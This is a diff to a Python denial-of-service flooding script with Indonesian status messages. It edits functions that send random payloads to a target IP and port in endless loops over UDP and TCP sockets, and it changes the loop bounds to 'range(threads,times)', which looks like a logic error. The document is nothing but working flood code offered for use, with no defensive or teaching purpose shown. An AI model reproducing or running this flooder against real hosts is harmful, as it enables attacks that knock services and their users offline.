@@ -60,13 +60,13 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._randrange(20577)
+	data = random._urandom(577)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
-			for x in range(times):
+			for x in range(threads,times):
 				s.sendto(data,addr)
 			print(i +" MENGIRIM PACKET KE TARGET!!!")
 		except:
@@ -80,7 +80,7 @@ def run2():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
-			for x in range(times):
+			for x in range(threads,times):
 				s.send(data)
 			print(i +" MENGIRIM PACKET KE SERVER!!!")
 		except:
